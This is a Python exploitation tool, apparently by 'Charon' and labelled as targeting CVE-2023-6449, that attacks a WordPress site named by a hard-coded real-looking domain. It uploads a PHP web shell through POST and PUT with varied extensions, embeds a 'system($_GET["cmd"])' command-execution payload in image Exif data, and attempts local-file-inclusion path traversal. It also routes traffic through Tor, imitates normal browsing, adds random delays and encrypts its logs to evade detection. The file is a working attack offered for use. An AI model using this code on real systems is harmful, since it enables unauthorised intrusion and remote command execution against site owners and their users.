import requests
import random
import string
import time
import os
from cryptography.fernet import Fernet
import urllib3
import subprocess

# Disable SSL warnings for unverified HTTPS requests
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ────────────────────────────────────────────────────────────────
#  Project: Advanced CVE-2023-6449 Exploitation Tool by Charon
#  This tool uploads either a PHP exploit file or an image file with embedded PHP code
#  Developed by: Charon | All rights reserved.
# ────────────────────────────────────────────────────────────────

# إعداد البروكسي لتشغيله عبر شبكة Tor
proxies = {
    'http': 'socks5h://localhost:9050',
    'https': 'socks5h://localhost:9050'
}

# قائمة روابط عشوائية لمحاكاة حركة المرور العادية
random_urls = [
    "https://example.com/home",
    "https://example.com/about",
    "https://example.com/services",
    "https://example.com/contact",
    "https://example.com/blog"
]

# دالة لمحاكاة حركة المرور العادية
def simulate_normal_traffic(session, url_list):
    random_url = random.choice(url_list)
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    }
    try:
        response = session.get(random_url, headers=headers, proxies=proxies)
        print(f"Visited {random_url} - Status Code: {response.status_code}")
    except requests.RequestException as e:
        print(f"Failed to visit {random_url}: {e}")

# دالة لتوليد أسماء ملفات عشوائية بامتداد معين
def random_filename(extension=".php"):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(10)) + extension

# إعداد التشفير لسجلات النشاط
key = Fernet.generate_key()
cipher_suite = Fernet(key)

# دالة لتسجيل النشاطات المشفرة
def log_activity(data):
    encrypted_data = cipher_suite.encrypt(data.encode())
    with open("exploit_log.txt", "ab") as log_file:
        log_file.write(encrypted_data + b"\n")

# دالة تأخير عشوائي
def random_delay(min_delay=1, max_delay=5):
    delay = random.uniform(min_delay, max_delay)
    time.sleep(delay)
    print(f"Random delay of {delay:.2f} seconds")

# دالة لتجربة رفع الملف بأكثر من محاولة في حال حدوث خطأ
def retry_request(func, retries=3):
    for attempt in range(retries):
        try:
            return func()
        except requests.exceptions.RequestException as e:
            log_activity(f"Attempt {attempt+1} failed: {e}")
            time.sleep(2)
    print("All attempts failed.")
    return None

# دالة لتضمين شيفرة PHP في بيانات Exif داخل الصورة
def embed_php_in_image(image_path, php_code):
    try:
        subprocess.run(["exiftool", f"-Comment={php_code}", image_path], check=True)
        print(f"PHP code embedded in {image_path} metadata.")
    except Exception as e:
        print(f"Failed to embed PHP code in image: {e}")

# دالة لرفع الملف باستخدام طريقة PUT
def upload_file_with_put(url, session, file_path):
    file_name = random_filename(".php")
    with open(file_path, 'rb') as file:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': '*/*'
        }
        response = retry_request(lambda: session.put(f"{url}/wp-content/uploads/{file_name}", data=file, headers=headers, proxies=proxies, verify=False))
        if response and response.status_code == 200:
            print(f"File uploaded successfully with PUT as {file_name}")
        else:
            print(f"PUT upload failed with status code {response.status_code}")

# دالة لرفع شل باستخدام POST بامتدادات متنوعة
def upload_shell_with_post(url, session, shell_path):
    extensions = [".php", ".phtml", ".phar", ".txt", ".html"]
    for ext in extensions:
        file_name = random_filename(ext)
        with open(shell_path, 'rb') as file:
            files = {'file': (file_name, file, 'application/octet-stream')}
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
            
            simulate_normal_traffic(session, random_urls)
            random_delay()
            
            response = retry_request(lambda: session.post(f"{url}/wp-content/uploads", files=files, headers=headers, proxies=proxies, verify=False))
            
            if response and response.status_code == 200:
                check_url = f"{url}/wp-content/uploads/{file_name}"
                log_activity(f"Shell uploaded successfully as {file_name}: {check_url}")
                print("Shell uploaded successfully as", file_name, ":", check_url)
                break
            else:
                print("Upload failed for", file_name)

# دالة لرفع صورة تحتوي على شيفرة PHP ضمن بيانات Exif
def upload_image(url, session, image_path, php_code):
    embed_php_in_image(image_path, php_code)
    
    with open(image_path, 'rb') as image:
        files = {'file': ('image.jpg', image, 'image/jpeg')}
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
        
        simulate_normal_traffic(session, random_urls)
        random_delay()
        
        response = retry_request(lambda: session.post(f"{url}/wp-content/uploads", files=files, headers=headers, proxies=proxies, verify=False))
        
        if response and response.status_code == 200:
            check_url = f"{url}/wp-content/uploads/image.jpg"
            log_activity(f"Image uploaded successfully: {check_url}")
            print("Image uploaded successfully:", check_url)
        else:
            log_activity("Image upload failed.")
            print("Image upload failed.")
        
        simulate_normal_traffic(session, random_urls)
        random_delay()

# دالة لمحاولة تنفيذ الشيفرة عبر تضمين الملفات المحلية (LFI)
def attempt_lfi(url, file_name):
    lfi_url = f"{url}/index.php?page=../../wp-content/uploads/{file_name}"
    response = retry_request(lambda: requests.get(lfi_url, proxies=proxies, verify=False))
    
    if response and "Expected Payload Output" in response.text:
        print("LFI exploitation successful!")
        log_activity("LFI exploitation successful")
    else:
        print("LFI exploitation failed.")
        log_activity("LFI exploitation failed")

# ────────────────────────────────────────────────────────────────
#  Execution: Choose option, set target URL, and run upload
# ────────────────────────────────────────────────────────────────

url = "https://oimt.ac.in"
session = requests.Session()

# Prompt user for file type to upload
choice = input("Choose file to upload - (1) Shell with POST and PUT (2) Image with PHP in metadata: ")

if choice == "1":
    shell_path = "/sec/root/charon_tool/313.php"
    if os.path.exists(shell_path):
        upload_shell_with_post(url, session, shell_path)
        upload_file_with_put(url, session, shell_path)
    else:
        print("Shell file not found at specified path.")
elif choice == "2":
    image_path = "/sec/root/charon_tool/charon.jpg"
    php_code = '<?php system($_GET["cmd"]); ?>'
    if os.path.exists(image_path):
        upload_image(url, session, image_path, php_code)
    else:
        print("Image file not found at specified path.")
else:
    print("Invalid choice. Please choose 1 or 2.")
